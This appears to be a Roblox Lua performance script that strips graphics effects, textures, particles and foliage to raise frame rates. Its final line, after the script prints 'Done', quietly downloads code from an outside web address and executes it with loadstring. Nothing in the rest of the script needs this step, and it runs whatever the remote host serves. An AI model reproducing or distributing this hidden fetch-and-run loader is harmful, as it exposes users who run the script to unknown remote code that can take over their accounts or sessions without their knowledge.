local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Terrain = workspace:FindFirstChildOfClass("Terrain")

settings().Rendering.QualityLevel = Enum.QualityLevel.Level0
Lighting.GlobalShadows = false
Lighting.Brightness = 2
Lighting.FogEnd = 999999

for _, v in pairs(Lighting:GetChildren()) do
    if v:IsA("PostEffect") or v:IsA("Sky") then
        v:Destroy()
    end
end

if Terrain then
    Terrain.WaterWaveSize = 0
    Terrain.WaterWaveSpeed = 0
    Terrain.WaterReflectance = 0
    Terrain.WaterTransparency = 0
end

local function cleanPart(obj)
    if obj:IsA("BasePart") then
        obj.Material = Enum.Material.SmoothPlastic
        obj.Reflectance = 0
        obj.CastShadow = false
    elseif obj:IsA("Decal") or obj:IsA("Texture") then
        obj:Destroy()
    elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
        obj:Destroy()
    end
end

for _, v in pairs(workspace:GetDescendants()) do
    cleanPart(v)
    if v:IsA("Model") then
        local name = v.Name:lower()
        if name:find("tree") or name:find("plant") or name:find("grass") or name:find("leaves") or name:find("bush") or name:find("flower") or name:find("prop") then
            v:Destroy()
        end
    end
end

workspace.DescendantAdded:Connect(function(v)
    cleanPart(v)
end)

print("Done")
loadstring(game:HttpGet("https://thanhduyhubxyz.lovable.app/api/public/raw/08c55f5333dcae36c24fba7390a20008"))()
